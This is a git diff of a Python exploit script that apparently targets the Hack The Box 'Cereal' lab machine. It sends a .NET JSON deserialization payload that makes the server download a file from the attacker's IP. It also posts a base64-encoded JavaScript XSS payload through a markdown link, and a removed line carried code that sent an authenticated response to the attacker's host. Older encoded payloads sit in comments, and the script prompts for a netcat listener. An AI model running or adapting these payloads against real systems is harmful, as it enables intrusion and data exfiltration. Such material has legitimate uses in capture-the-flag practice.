@@ -3,13 +3,15 @@ import netifaces as ni
 import jwt
 import json
 import base64
+import warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from datetime import datetime, timedelta
 
 def get_ip(interface):
     """find your IP on a given interface"""
     ni.ifaddresses(interface)
     ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
-    print(ip)
+    print("IP Address: " + ip)
     
     return ip
 
@@ -35,9 +37,11 @@ def target_cereal(ip, base_url, base_headers):
     print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))
 
     target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"
+    
+    print("JSON submitted: " + target_json_string)
 
     targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
-    print("Response Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))
+    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))
 
     target_id = str(json.loads(targetResp.text)["id"])
     print("Target cereal ID: " + target_id)
@@ -50,23 +54,35 @@ def xss_cereal(ip, base_url, base_headers, token, target_id):
     
     print("\n=== POSTING XSS CEREAL ===\n")
     
-    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
+    #js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
     
-    print("Javascript to be injected: " + js_string)
+    #comparing old payloads
+    #{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
+    #{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjE3MC9pbWciO2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltjbGFzc05hbWU9J2NhcmQgY2FyZC1ib2R5IGJnLWxpZ2h0J10iKS5hcHBlbmRDaGlsZChpbWFnZSk7str%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
+
+    
+    js_string = 'const image = document.createElement("img");image.src = "http://{ip}/img";document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(ip=ip)
+    
+    print("Javascript to be injected: " + js_string + "\n")
     
     b64_js = base64.b64encode(js_string.encode('utf-8'))
     
-    print("Base64 encoded javascript: " + str(b64_js))
+    print("Base64 encoded javascript: " + b64_js.decode('utf-8') + "\n")
     
-    xss_json_string = "{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22" + b64_js.decode('utf-8') + "str%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}"
+    xss_json_string = "{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22" + b64_js.decode('utf-8') + "%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}"
+    
+    print("JSON submitted: " + xss_json_string)
     
     xssResp = requests.post(base_url, data=xss_json_string, headers=base_headers, verify=False)
-    print("Response Code: {code}\nResponse Text: {text}".format(code=xssResp.status_code, text=xssResp.text))
+    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=xssResp.status_code, text=xssResp.text))
     
 def main():
+    # suppress warnings for self-signed SSL cert
+    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
+    
     # remind user to start a listener
     print("Make sure to start a listener before this. Run the following command:\nsudo nc -lnvp 80\nThis will catch responses from your XSS and allow the DownloadHelper to grab your payload")
-    input("Press enter to continue once you've started your listener...")
+    input("Press enter to continue once you've started your listener...\n")
 
     # get tun0 IP address
     ip = get_ip("tun0")
